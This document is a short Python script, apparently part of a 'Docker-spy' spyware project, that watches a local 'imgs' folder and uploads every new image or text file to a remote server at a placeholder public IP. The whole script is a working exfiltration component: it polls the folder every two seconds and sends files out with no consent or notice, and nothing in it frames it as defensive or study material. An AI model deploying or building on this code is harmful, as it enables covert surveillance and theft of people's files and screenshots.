import os
import time
import requests

WATCH_FOLDER = r"D:\code\marvel\Level-2-\Docker-spy\Spyware\imgs"  # folder to monitor
UPLOAD_URL = "http://<publicIP>:5000/upload"

os.makedirs(WATCH_FOLDER, exist_ok=True)  # make sure the folder exists

# list to store already processed files
processed_files = []

def scan_folder():
    files = os.listdir(WATCH_FOLDER)

    for file in files:
        file_path = os.path.join(WATCH_FOLDER, file)

        if file_path in processed_files:
            continue

        else:
            if file_path.endswith((".png",".jpg",".jpeg",".txt")): #file formats to detect
                print(f"new img detected: {file_path}")
                processed_files.append(file_path)
                upload_image(file_path)

def upload_image(file_path):
    with open(file_path, "rb") as file:
        response = requests.post(UPLOAD_URL, files={"file": file})
        print(f"uploaded {file_path}: {response.text}")

if __name__ == "__main__":
    print(f"monitoring folder: {WATCH_FOLDER}")
    try:
        while True:
            scan_folder()  # check for new imgs
            time.sleep(2)  
    except KeyboardInterrupt:
        print("stopping monitoring")
